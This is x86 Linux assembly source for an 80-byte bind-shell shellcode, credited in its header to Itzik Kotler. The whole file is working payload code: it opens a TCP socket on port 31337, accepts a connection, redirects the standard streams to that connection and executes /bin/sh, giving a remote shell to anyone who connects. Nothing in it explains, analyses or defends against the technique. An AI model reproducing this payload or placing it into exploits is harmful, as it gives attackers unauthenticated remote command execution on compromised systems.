#
# (linux/x86) bind '/bin/sh' to 31337/tcp - 80 bytes
# - Itzik Kotler <ik@ikotler.org>
#

.section .text
	.global _start
	_start:

		push $0x66
		popl %eax
		cdq
		pushl $0x1
		popl %ebx
		pushl %edx
		pushl %ebx
		pushl $0x2

	_doint:

		movl %esp, %ecx
		int $0x80

		popl %ebx
		popl %ebp
		pushl %edx
		movw $0x7a69, %bp
		bswap %ebp
		orl %ebx, %ebp
		pushl %ebp
		push $0x10
		push %ecx
		push %eax
		movl %esp, %ecx
		movb $0x66, %al
		int $0x80

		movb $0x4, %bl
		movb $0x66, %al
		int $0x80

		movl %esp, 0x8(%esp)
		incl %ebx
		movb $0x66, %al
		int $0x80

		xchgl %eax, %ebx
		popl %ecx

	_dup2loop:

		movb $0x3f, %al
		int $0x80
		decl %ecx
		jns _dup2loop

	_exec:

		movb $0xb, %al
		pushl %edx
	        push $0x68732f2f
	        push $0x6e69622f
		movl %esp, %ebx
		push %edx
		push %ebx
		jmp _doint
